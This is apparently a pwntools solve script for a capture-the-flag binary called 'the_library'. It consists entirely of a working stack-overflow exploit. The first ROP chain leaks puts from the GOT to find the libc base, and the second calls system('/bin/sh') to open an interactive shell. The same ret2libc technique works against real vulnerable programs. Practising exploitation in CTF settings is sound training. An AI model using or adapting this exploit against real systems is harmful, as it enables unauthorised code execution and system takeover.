from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *main
continue
'''.format(**locals())

exe = './challenge/the_library'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc
p = start()

pop_rdi_ret = 0x0000000000401493
ret = 0x000000000040101a

p.sendlineafter(b'> ', flat(
    cyclic(552),
    pop_rdi_ret,
    elf.got.puts,
    elf.plt.puts,
    elf.entrypoint
)); p.recvline()

leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
info("Leak got pust: " + hex(leak))

libc.address = leak - (libc.sym.puts)
p.sendlineafter(b'> ', flat(
    cyclic(552),
    pop_rdi_ret,
    next(libc.search(b'/bin/sh\x00')),
    ret,
    libc.sym.system
)); p.recvline()

p.interactive()
